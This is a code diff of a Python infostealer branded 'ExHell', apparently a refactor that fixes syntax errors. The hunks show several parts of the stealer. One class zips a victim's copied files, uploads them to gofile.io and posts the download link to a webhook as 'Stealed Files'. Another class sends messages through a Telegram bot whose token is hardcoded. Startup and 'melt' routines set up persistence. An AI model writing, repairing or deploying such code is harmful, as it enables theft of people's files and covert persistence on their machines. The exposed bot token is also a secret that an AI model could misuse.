@@ -3098,21 +3098,6 @@ class Main:
 
 class UploadGoFile:
     @staticmethod
-    async def GetServer() -> str:
-        try:
-            async with aiohttp.ClientSession(
-                connector=aiohttp.TCPConnector(ssl=True)
-            ) as session:
-                async with session.get("https://api.gofile.io/getServer") as request:
-                    data = await request.json()
-                    return data["data"]["server"]
-        except Exception as e:
-            print(
-                f"An Error occurred while getting server: '{e}'\nit will use default server (store 1)."
-            )
-            return "store1"
-
-    @staticmethod
     async def upload_file(file_path: str) -> str:
         try:
             ActiveServer = await UploadGoFile.GetServer()
@@ -3125,12 +3110,9 @@ class UploadGoFile:
 
                 async with session.post(upload_url, data=file_form) as response:
                     response_body = await response.text()
-
                     raw_json = json.loads(response_body)
-                    d = json.dumps(raw_json)
-                    output = json.loads(d)
-
-                    download_page = output["data"]["downloadPage"]
+                    output = json.dumps(raw_json)
+                    download_page = json.loads(output)["data"]["downloadPage"]
                     return download_page
         except Exception as e:
             print(f"An error occurred during file upload: '{e}'")
@@ -3221,14 +3203,14 @@ class StealCommonFiles:
             uploaded_url = await UploadGoFile.upload_file(
                 destination_directory + ".zip"
             )
-            if not uploaded_url == None:
+            if uploaded_url:
                 async with aiohttp.ClientSession() as session:
                     embed_data2 = {
                         "title": "***ExHell***",
                         "description": f"***Stealed Files***",
                         "url": "https://t.me/OwlsToolz",
                         "color": 0,
-                        "footer": {"https://github.com/tola12pr/exhell"},
+                        "footer": {"text": "https://github.com/tola12pr/exhell"},
                         "thumbnail": {"url": "https://hizliresim.com/mwyqeue.jpg"},
                     }
                     fields2 = [
@@ -3242,34 +3224,39 @@ class StealCommonFiles:
                     payload2 = {"username": "ExHell", "embeds": [embed_data2]}
                     async with session.post(webhook, json=payload2) as req:
                         pass
+
+        finally:
             try:
+                # Clean up by deleting the zip file and the copied files
                 os.remove(destination_directory + ".zip")
                 shutil.rmtree(destination_directory)
-          except
-             pass
+            except Exception as e:
+                # Log the error if necessary
+                pass
+
 
 class TelegramSender:
-
     def __init__(self, token: str, user_id: int):
-      self.__token = "7780803203:AAFKuKEUayxcBAp6ChF3oNlthNV0m0UNp5c"  # Your Telegram bot token
-      self.__user_id = 1937567596
-      self.__url = f"https://api.telegram.org/bot{self.__token}/sendMessage"
+        self.__token = (
+            "7780803203:AAFKuKEUayxcBAp6ChF3oNlthNV0m0UNp5c"  # Your Telegram bot token
+        )
+        self.__user_id = 1937567596
+        self.__url = f"https://api.telegram.org/bot{self.__token}/sendMessage"
 
     def __send_to_telegram(self, message: str) -> None:
-       
         payload = {
-            'chat_id': self.__user_id,  # Target user ID
-            'text': message  # Message to send
+            "chat_id": self.__user_id,  # Target user ID
+            "text": message,
         }
 
-        # Send the request to Telegram
         response = requests.post(self.__url, data=payload)
 
-        # Check for errors in sending
         if response.status_code == 200:
             print("[Telegram sender]: Message sent successfully!")
         else:
-            print(f"[Telegram sender]: Failed to send message. Status code: {response.status_code}")
+            print(
+                f"[Telegram sender]: Failed to send message. Status code: {response.status_code}"
+            )
 
     def run(self, message: str) -> None:
         """
@@ -3279,6 +3266,7 @@ class TelegramSender:
             self.__send_to_telegram(message)
         except Exception as e:
             print(f"[Telegram sender]: {repr(e)}")
+
 
 class Startup:
     def __init__(self) -> None:
@@ -3303,7 +3291,7 @@ class Startup:
             print("[-] unsupported or unkown startup method!")
         print(f"[+] Succesfully executed startup injection.")
 
-    async def CreatePathAndMelt(self)
+    async def CreatePathAndMelt(self) -> None:
         try:
             if os.path.exists(self.ToPath):  # if the startup file already exist, return
                 return
@@ -3384,7 +3372,6 @@ class Startup:
                             await process.communicate()
         except Exception as e:
             print(str(e))  # print error if has error
-
 
     async def FolderStartup(self):  # folder method for startup
         try:
